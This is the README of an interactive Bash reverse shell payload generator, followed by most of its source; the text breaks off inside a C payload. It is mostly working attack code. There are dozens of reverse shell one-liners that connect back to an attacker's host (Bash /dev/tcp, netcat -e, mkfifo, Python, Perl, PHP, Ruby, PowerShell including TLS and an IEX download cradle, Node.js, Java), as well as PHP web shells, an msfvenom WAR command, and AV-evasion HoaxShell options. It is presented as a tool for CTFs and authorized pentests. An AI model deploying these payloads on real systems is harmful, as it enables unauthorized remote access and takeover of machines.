<div align=center>

# Reverse Shell Generator (CLI)

This is the readme file for [`Reverse_Shell-Generator-CLI.sh`](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Bash-Scripts/Reverse_Shell-Generator-CLI.sh) — a fully interactive, terminal-based reverse shell payload generator covering **15 categories** and **100+ payload variants** for CTF labs, authorized pentests, and security research.

</div>

---

## 📑 Table of Contents

- [Reverse Shell Generator (CLI)](#reverse-shell-generator-cli)
  - [📑 Table of Contents](#-table-of-contents)
  - [🎯 What It Does](#-what-it-does)
  - [📦 Payload Categories](#-payload-categories)
  - [🚀 Quick Start](#-quick-start)
  - [⚙️ Usage / Interactive Flow](#️-usage--interactive-flow)
  - [🖥️ Supported Platforms](#️-supported-platforms)
  - [📋 Prerequisites](#-prerequisites)
  - [🔗 Related Resources](#-related-resources)
  - [⚠️ Disclaimer](#️-disclaimer)
  - [📝 Notes](#-notes)
  - [The Actual Script](#the-actual-script)

---

<br/>
<br/>


## 🎯 What It Does

Instead of bookmarking a dozen reverse shell cheat-sheet websites, this single script gives you an **interactive CLI menu** that:

1. Prompts you for **LHOST**, **LPORT**, and preferred **shell binary** (`/bin/bash`, `/bin/sh`, `cmd.exe`, etc.)
2. Presents a **numbered category menu** (1–16)
3. Prints **copy-paste-ready payloads** with your values already substituted
4. Shows the matching **listener command** for each payload
5. Ends every selection with a **listener reminder** and a link to the [Reverse Shell Upgrade guide](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md)


<br/>
<br/>

---

## 📦 Payload Categories

| # | Category | Variants | Highlights |
|---|----------|----------|------------|
| 1 | **Bash** | 5 | `/dev/tcp`, `mkfifo`, named-pipe, `bash -i`, `0<&196` |
| 2 | **Netcat** | 8 | `nc -e`, `nc -c`, `mkfifo` pipe, BusyBox, `ncat`, UDP |
| 3 | **Python** | 6 | `socket` + `subprocess`, `pty.spawn`, one-liners, IPv6 |
| 4 | **Perl** | 3 | `Socket` module, `exec`, `open` pipe |
| 5 | **PHP** | 10 | `exec`, `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `fsockopen`, `socket_create`, `pcntl_exec` |
| 6 | **Ruby** | 2 | `TCPSocket` + `exec`, `Socket` one-liner |
| 7 | **PowerShell** | 7 | `TCPClient`, `WebClient` download-cradle, `Invoke-Expression`, ConPty, named-pipe |
| 8 | **Node.js / JS** | 3 | `child_process`, `net.Socket`, one-liner |
| 9 | **Java / Groovy** | 7 | `Runtime.exec`, `ProcessBuilder`, Groovy `execute()`, JSP webshell |
| 10 | **Compiled** | 8+ | C (Linux/Windows), C# (TCP / Bash -i), Go, Rust, Dart, Crystal, V |
| 11 | **Other** | 12+ | Socat, OpenSSL (encrypted), Lua, Awk, Telnet, Zsh, sqlite3, curl, rustcat, Haskell, Xterm |
| 12 | **Encoded** | 5 | Base64, URL-encoded, Double URL-encoded, Hex, PowerShell Base64 (UTF-16LE) |
| 13 | **MSFVenom** | 14 | Windows/Linux/macOS Meterpreter (staged & stageless), PHP, ASP, JSP, WAR, Python, Bash, Perl |
| 14 | **HoaxShell** | 3 | HTTP(S)-based shells for Windows CMD, PowerShell, Linux — AV-evasion via legitimate HTTP traffic |
| 15 | **Listeners** | 17 | `nc`, `ncat`, `rlwrap`, `socat`, `openssl`, `pwncat`, `powercat`, `msfconsole`, `hoaxshell`, and more |
| 16 | **Show ALL** | — | Dumps every category in one scroll |

<br/>
<br/>

---

## 🚀 Quick Start

```bash
# 1. Download and make it executable
wget https://raw.githubusercontent.com/Maat-Cyber/Maat-Cyber-World/refs/heads/main/Bash-Scripts/Reverse_Shell-Generator-CLI.sh
chmod +x Reverse_Shell-Generator-CLI.sh

# 2. Run it
./Reverse_Shell-Generator-CLI.sh
```

No dependencies beyond a standard Linux/macOS terminal. The script uses only **Bash built-ins**, `base64`, `xxd`, and optionally `python3` (for URL-encoding in the *Encoded* category).

<br/>
<br/>

---

## ⚙️ Usage / Interactive Flow

```
┌──────────────────────────────────────────┐
│   🔱 REVERSE SHELL GENERATOR CLI 🔱     │
└──────────────────────────────────────────┘

[>] LHOST (your IP):    10.10.14.7
[>] LPORT:              4444
[>] Shell binary [/bin/bash]: /bin/sh

Select payload category:

 1)  Bash          (5 variants)
 2)  Netcat        (8 variants)
 3)  Python        (6 variants)
 ...
 16) Show ALL payloads
 0)  Exit

[>] Choice: 3
```


After each selection the script prints:

- ✅ The **payload** with your `LHOST` / `LPORT` / shell already injected
- 🎧 The matching **listener command**
- 📌 A **listener reminder** block with `nc`, `rlwrap`, and `pwncat-cs` options
- 🔗 A link to the **Reverse Shell Upgrade** guide in this repo

<br/>
<br/>

---

## 🖥️ Supported Platforms

| Target OS | Coverage |
|-----------|----------|
| **Linux** | ✅ All 15 categories |
| **macOS** | ✅ Most categories (Bash, Python, Perl, Ruby, Socat, etc.) |
| **Windows** | ✅ PowerShell, C (Windows), C#, MSFVenom, HoaxShell, ConPty |

> Each payload line is tagged with its compatible platform(s): `linux`, `mac`, `windows`.

<br/>
<br/>

---

## 📋 Prerequisites

| Requirement | Why | Install |
|-------------|-----|---------|
| **Bash 4+** | Script runtime | Pre-installed on most Linux/macOS |
| **base64** | Encoded payloads category | Pre-installed (`coreutils`) |
| **xxd** | Hex-encoded payloads | `apt install xxd` / pre-installed on Kali |
| **python3** *(optional)* | URL / double-URL encoding | `apt install python3` |

> 💡 The script **runs without** any optional tools — it simply prints the commands for you to execute on the target or your attack box.

<br/>
<br/>

---

## 🔗 Related Resources

| Resource | Link |
|----------|------|
| 📖 Reverse Shell Upgrade Guide | [`Tips-&-Resources/Reverse_Shell-Upgrade.md`](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md) |
| 🌐 Online alternative | [revshells.com](https://www.revshells.com/) |
| 🐙 HoaxShell repo | [github.com/t3l3machus/hoaxshell](https://github.com/t3l3machus/hoaxshell) |
| 🛡️ pwncat-cs | [github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat) |
| 📂 Parent repo | [Maat-Cyber-World](https://github.com/Maat-Cyber/Maat-Cyber-World) |

<br/>
<br/>

---

## ⚠️ Disclaimer

> **This tool is for authorized security testing, CTF competitions, and educational purposes only.**
>
> Generating or deploying reverse shells against systems you do **not** own or have **explicit written permission** to test is **illegal** in most jurisdictions. The author assumes no liability for misuse.
>
> Always operate within the rules of engagement of your CTF platform (TryHackMe, HackTheBox, OverTheWire, etc.) or your authorized pentest scope.


<br/>
<br/>

---

## 📝 Notes

- **1059 lines · ~52 KB** — everything in a single portable `.sh` file.
- Payloads are printed to **stdout**; pipe to a file if you want to save them:
  ```bash
  ./Reverse_Shell-Generator-CLI.sh | tee payloads.txt
  ```
- The **Encoded** category dynamically generates Base64 / Hex / URL-encoded strings at runtime using your `LHOST`/`LPORT` values.
- After catching a shell, **always upgrade it** to a full TTY — see the [Reverse Shell Upgrade guide](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md) in this repo.

<br/>
<br/>

---

## The Actual Script
```bash
#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════
#  Reverse Shell Payload Generator v2.0
#  Author: Maat | Maat-Cyber-World
#  Repo:   https://github.com/Maat-Cyber/Maat-Cyber-World/
#  Desc   : Interactive menu-driven reverse shell payload generator.
#           Produces one-liners in 15 languages/techniques with
#           user-specified IP and port. Includes encoded variants.
#
#  USAGE  : ./Reverse_Shell-Generator.sh [-i IP] [-p PORT] [-h] [-s SHELL] or nothing for interactive mode.
#
#  Note   : This is super quick shell generator in pure bash, if you want a more polished UI check out the great https://www.revshells.com/ which can also be self-hosted.
# ═══════════════════════════════════════════════════════════════════════════

set -euo pipefail

# ── Colors ──────────────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

# ── Defaults ────────────────────────────────────────────────────────────────
LHOST=""
LPORT=""
SHELL_BIN="/bin/sh"

# ── Usage ───────────────────────────────────────────────────────────────────
usage() {
    echo -e "${BOLD}Usage:${NC} $0 [-i LHOST] [-p LPORT] [-s SHELL] [-h]"
    echo ""
    echo "  -i LHOST   Listener IP address   (e.g., 10.10.14.5)"
    echo "  -p LPORT   Listener port         (e.g., 9001)"
    echo "  -s SHELL   Shell binary           (default: /bin/sh)"
    echo "             Options: sh, bash, /bin/sh, /bin/bash, cmd, powershell, pwsh,"
    echo "                      ash, csh, ksh, zsh, dash, mksh, tcsh"
    echo "  -h         Show this help message"
    echo ""
    echo "If -i and -p are omitted, the script will prompt interactively."
    exit 0
}

# ── Argument Parsing ────────────────────────────────────────────────────────
while getopts "i:p:s:h" opt; do
    case $opt in
        i) LHOST="$OPTARG" ;;
        p) LPORT="$OPTARG" ;;
        s) SHELL_BIN="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# ── Prompt for IP and Port if not provided ──────────────────────────────────
if [[ -z "$LHOST" ]]; then
    echo -ne "${CYAN}[?]${NC} Enter your listener IP (LHOST): "
    read -r LHOST
fi

if [[ -z "$LPORT" ]]; then
    echo -ne "${CYAN}[?]${NC} Enter your listener port (LPORT): "
    read -r LPORT
fi

# Validate inputs
if [[ -z "$LHOST" || -z "$LPORT" ]]; then
    echo -e "${RED}[!]${NC} Both LHOST and LPORT are required."
    exit 1
fi

# ── Banner ──────────────────────────────────────────────────────────────────
echo ""
echo -e "${MAGENTA}${BOLD}"
echo "  ╔══════════════════════════════════════════════════════════════╗"
echo "  ║     Reverse Shell Payload Generator v2.0                     ║"
echo "  ║     Author: Maat | Maat-Cyber-World                          ║"
echo "  ║                                                              ║"
echo "  ╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "  ${GREEN}LHOST${NC}  : ${BOLD}${LHOST}${NC}"
echo -e "  ${GREEN}LPORT${NC}  : ${BOLD}${LPORT}${NC}"
echo -e "  ${GREEN}SHELL${NC}  : ${BOLD}${SHELL_BIN}${NC}"
echo ""

# ── Helper: print a payload block ──────────────────────────────────────────
print_payload() {
    local title="$1"
    local payload="$2"
    local meta="${3:-}"
    echo -e "${YELLOW}${BOLD}── ${title}${NC}"
    if [[ -n "$meta" ]]; then
        echo -e "  ${DIM}[${meta}]${NC}"
    fi
    echo -e "${GREEN}${payload}${NC}"
    echo ""
}

print_multiline() {
    local title="$1"
    local meta="${2:-}"
    shift 2
    echo -e "${YELLOW}${BOLD}── ${title}${NC}"
    if [[ -n "$meta" ]]; then
        echo -e "  ${DIM}[${meta}]${NC}"
    fi
    echo -e "${GREEN}"
    cat
    echo -e "${NC}"
    echo ""
}

print_note() {
    echo -e "  ${CYAN}ℹ ${1}${NC}"
    echo ""
}

print_listener() {
    echo -e "  ${CYAN}Listener:${NC} ${GREEN}${1}${NC}"
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 1: BASH  (5 variants from data.js)
# ═══════════════════════════════════════════════════════════════════════════

payload_bash() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║         BASH VARIANTS                ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_payload "Bash -i" \
"${SHELL_BIN} -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1" \
"linux, mac"

    print_payload "Bash 196" \
"0<&196;exec 196<>/dev/tcp/${LHOST}/${LPORT}; ${SHELL_BIN} <&196 >&196 2>&196" \
"linux, mac"

    print_payload "Bash read line" \
"exec 5<>/dev/tcp/${LHOST}/${LPORT};cat <&5 | while read line; do \$line 2>&5 >&5; done" \
"linux, mac"

    print_payload "Bash 5" \
"${SHELL_BIN} -i 5<> /dev/tcp/${LHOST}/${LPORT} 0<&5 1>&5 2>&5" \
"linux, mac"

    print_payload "Bash UDP" \
"${SHELL_BIN} -i >& /dev/udp/${LHOST}/${LPORT} 0>&1" \
"linux, mac"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 2: NETCAT  (8 variants from data.js)
# ═══════════════════════════════════════════════════════════════════════════

payload_netcat() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║         NETCAT VARIANTS              ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_payload "nc mkfifo" \
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${SHELL_BIN} -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f" \
"linux, mac"

    print_payload "nc -e" \
"nc ${LHOST} ${LPORT} -e ${SHELL_BIN}" \
"linux, mac"

    print_payload "nc.exe -e" \
"nc.exe ${LHOST} ${LPORT} -e ${SHELL_BIN}" \
"windows"

    print_payload "BusyBox nc -e" \
"busybox nc ${LHOST} ${LPORT} -e ${SHELL_BIN}" \
"linux"

    print_payload "nc -c" \
"nc -c ${SHELL_BIN} ${LHOST} ${LPORT}" \
"linux, mac"

    print_payload "ncat -e" \
"ncat ${LHOST} ${LPORT} -e ${SHELL_BIN}" \
"linux, mac"

    print_payload "ncat.exe -e" \
"ncat.exe ${LHOST} ${LPORT} -e ${SHELL_BIN}" \
"windows"

    print_payload "ncat udp" \
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${SHELL_BIN} -i 2>&1|ncat -u ${LHOST} ${LPORT} >/tmp/f" \
"linux, mac"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 3: PYTHON  (6 variants from data.js)
# ═══════════════════════════════════════════════════════════════════════════

payload_python() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║         PYTHON VARIANTS              ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_payload "Python #1" \
"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"${SHELL_BIN}\",\"-i\"]);'" \
"linux, mac"

    print_payload "Python #2 (pty)" \
"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"${SHELL_BIN}\")'" \
"linux, mac"

    print_payload "Python3 #1" \
"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"${SHELL_BIN}\",\"-i\"]);'" \
"linux, mac"

    print_payload "Python3 #2 (pty)" \
"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"${SHELL_BIN}\")'" \
"linux, mac"

    print_payload "Python3 Windows" \
"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"cmd.exe\"]);'" \
"windows"

    print_payload "Python3 shortest" \
"python3 -c 'import os,socket,pty;s=socket.socket();s.connect((\"${LHOST}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"${SHELL_BIN}\")'" \
"linux, mac"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 4: PERL  (3 variants from data.js)
# ═══════════════════════════════════════════════════════════════════════════

payload_perl() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║         PERL VARIANTS                ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_payload "Perl" \
"perl -e 'use Socket;\$i=\"${LHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"${SHELL_BIN} -i\");};'" \
"linux, mac"

    print_payload "Perl no sh" \
"perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"${LHOST}:${LPORT}\");STDIN->fdopen(\$c,r);\$~->fdopen(\$c,w);system\$_ while<>;'" \
"linux, mac"

    print_note "Perl PentestMonkey: Full script at pentestmonkey.net/tools/web-shells/perl-reverse-shell"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 5: PHP  (10 variants from data.js)
# ═══════════════════════════════════════════════════════════════════════════

payload_php() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║         PHP VARIANTS                 ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_payload "PHP exec" \
"php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});exec(\"${SHELL_BIN} -i <&3 >&3 2>&3\");'" \
"linux, mac"

    print_payload "PHP shell_exec" \
"php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});shell_exec(\"${SHELL_BIN} -i <&3 >&3 2>&3\");'" \
"linux, mac"

    print_payload "PHP system" \
"php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});system(\"${SHELL_BIN} -i <&3 >&3 2>&3\");'" \
"linux, mac"

    print_payload "PHP passthru" \
"php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});passthru(\"${SHELL_BIN} -i <&3 >&3 2>&3\");'" \
"linux, mac"

    print_payload "PHP backtick" \
"php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});\`exec ${SHELL_BIN} -i <&3 >&3 2>&3\`;'" \
"linux, mac"

    print_payload "PHP popen" \
"php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});popen(\"${SHELL_BIN} -i <&3 >&3 2>&3\", \"r\");'" \
"linux, mac"

    print_payload "PHP proc_open" \
"php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});\$proc=proc_open(\"${SHELL_BIN} -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);'" \
"linux, mac, windows"

    print_payload "PHP cmd (webshell form)" \
"<?php echo \"<form method=GET><input name=cmd><input type=submit></form>\"; if(isset(\$_GET['cmd'])){echo \"<pre>\"; echo shell_exec(\$_GET['cmd']); echo \"</pre>\";} ?>" \
"linux, windows, mac"

    print_payload "PHP cmd small" \
"<?=\`\$_GET[0]\`?>" \
"linux, windows, mac"

    print_note "PHP PentestMonkey & Ivan Sincek: Full scripts at pentestmonkey.net / github.com/ivan-sincek"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 6: RUBY  (2 variants from data.js)
# ═══════════════════════════════════════════════════════════════════════════

payload_ruby() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║         RUBY VARIANTS                ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_payload "Ruby #1" \
"ruby -rsocket -e 'f=TCPSocket.open(\"${LHOST}\",${LPORT}).to_i;exec sprintf(\"${SHELL_BIN} -i <&%d >&%d 2>&%d\",f,f,f)'" \
"linux, mac"

    print_payload "Ruby no sh" \
"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"${LHOST}\",${LPORT});while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'" \
"linux, mac"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 7: POWERSHELL  (7 variants from data.js)
# ═══════════════════════════════════════════════════════════════════════════

payload_powershell() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║       POWERSHELL VARIANTS            ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_payload "PowerShell #1 (TCP)" \
"powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"" \
"windows"

    print_payload "PowerShell #2 (named pipe)" \
"powershell -nop -c \"\$pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.', 'testpipe', 'InOut'); \$pipe.Connect(${LPORT}); \$sr = New-Object System.IO.StreamReader(\$pipe); \$sw = New-Object System.IO.StreamWriter(\$pipe); while(\$true){ \$cmd = \$sr.ReadLine(); if(\$cmd -eq 'exit'){break}; \$result = Invoke-Expression \$cmd 2>&1 | Out-String; \$sw.WriteLine(\$result); \$sw.Flush() }; \$pipe.Close()\"" \
"windows"

    print_payload "PowerShell #3 (Base64)" \
"powershell -nop -enc <BASE64_UTF16LE_ENCODED_PAYLOAD>" \
"windows"
    print_note "Generate: echo -n '<PS_PAYLOAD>' | iconv -t UTF-16LE | base64 -w0"
    echo ""

    print_payload "PowerShell #4 (TLS)" \
"powershell -nop -c \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; \$client = New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT}); \$sslStream = New-Object System.Net.Security.SslStream(\$client.GetStream(), \$false, ({\$true} -as [System.Net.Security.RemoteCertificateValidationCallback])); \$sslStream.AuthenticateAsClient('${LHOST}'); \$stream = \$sslStream; [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i); \$sendback = (iex \$data 2>&1 | Out-String); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"" \
"windows"

    print_payload "PowerShell #5 (stderr support)" \
"powershell -nop -c \"\$ErrorView='NormalView';\$ErrorActionPreference='Continue';\$c=New-Object System.Net.Sockets.TCPClient('${LHOST}',${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne0){\$d=([text.encoding]::ASCII).GetString(\$b,0,\$i);try{\$o=iex \$d 2>&1 3>&1 4>&1 5>&1 6>&1|Out-String}catch{\$o=\$_|Out-String}if([string]::IsNullOrEmpty(\$o)){\$o=''}\$p='PS '+(pwd).Path+'> ';[byte[]]\$sb=([text.encoding]::ASCII).GetBytes(\$o+\$p);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()\"" \
"windows"

    print_payload "PowerShell Download Cradle" \
"powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://${LHOST}:${LPORT}/shell.ps1')\"" \
"windows"

    print_payload "Windows ConPty (listener side)" \
"stty raw -echo; (stty size; cat) | nc -lvnp ${LPORT}" \
"windows"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 8: NODE.JS / JAVASCRIPT  (3 variants from data.js)
# ═══════════════════════════════════════════════════════════════════════════

payload_nodejs() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║     NODE.JS / JAVASCRIPT             ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_payload "Node.js #1" \
"node -e \"require('child_process').exec('${SHELL_BIN} -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1')\"" \
"linux, mac"

    print_payload "Node.js #2 (net module)" \
"node -e \"var net=require('net'),cp=require('child_process'),sh=cp.spawn('${SHELL_BIN}',[]);var client=new net.Socket();client.connect(${LPORT},'${LHOST}',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});\"" \
"linux, mac"

    print_payload "JavaScript (browser/eval)" \
"(function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('${SHELL_BIN}',[]);var client=new net.Socket();client.connect(${LPORT},'${LHOST}',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();" \
"linux, mac"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 9: JAVA / GROOVY  (7 variants from data.js)
# ═══════════════════════════════════════════════════════════════════════════

payload_java() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║       JAVA / GROOVY                  ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    print_multiline "Java #1 (ProcessBuilder)" "linux, mac, windows" <<'JAVAEOF'
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
JAVAEOF
    print_note "Replace LHOST→${LHOST}, LPORT→${LPORT}"
    echo ""

    print_multiline "Java #2 (Socket)" "linux, mac, windows" <<'JAVAEOF'
String host="LHOST";
int port=LPORT;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
}
p.destroy();s.close();
JAVAEOF
    print_note "Replace LHOST→${LHOST}, LPORT→${LPORT}"
    echo ""

    print_payload "Java #3 (one-liner)" \
"r=new java.lang.ProcessBuilder(\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\").start()" \
"linux, mac"

    print_payload "Java Web (WAR)" \
"msfvenom -p java/jsp_shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f war > shell.war" \
"linux, windows, mac"

    print_multiline "Java Two Way" "linux, mac, windows" <<'JAVAEOF'
import java.io.*;import java.net.*;
public class Shell{public static void main(String[] a)throws Exception{
Socket s=new Socket("LHOST",LPORT);
Process p=new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
new Thread(()->{try{var i=s.getInputStream();var o=p.getOutputStream();
int b;while((b=i.read())!=-1)o.write(b);}catch(Exception e){}}).start();
var i=p.getInputStream();var o=s.getOutputStream();
int b;while((b=i.read())!=-1)o.write(b);}}
JAVAEOF
    print_note "Replace LHOST→${LHOST}, LPORT→${LPORT}"
    echo ""

    print_payload "Groovy" \
"String host=\"${LHOST}\";int port=${LPORT};String cmd=\"${SHELL_BIN}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();" \
"linux, mac, windows"

    print_payload "Groovy (Alternative)" \
"def cmd = [\"${SHELL_BIN}\", \"-c\", \"exec 5<>/dev/tcp/${LHOST}/${LPORT};cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"]; cmd.execute()" \
"linux, mac"
}

# ═══════════════════════════════════════════════════════════════════════════
#  CATEGORY 10: COMPILED LANGUAGES  (C, C#, Go, Rust, Dart, Crystal, V)
# ═══════════════════════════════════════════════════════════════════════════

payload_compiled() {
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${BLUE}${BOLD}║     COMPILED LANGUAGES               ║${NC}"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""

    # ── C (Linux) ──
    print_multiline "C (Linux)" "linux, mac" <<CEOF
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(void){
    int port = ${LPORT};
    struct sockaddr_in revsockaddr;
    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("${LHOST}");
    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char * const argv[] = {"${SHELL_BIN}", NULL};
    execvp("${SHELL_BIN}", argv);
    return 0;
}
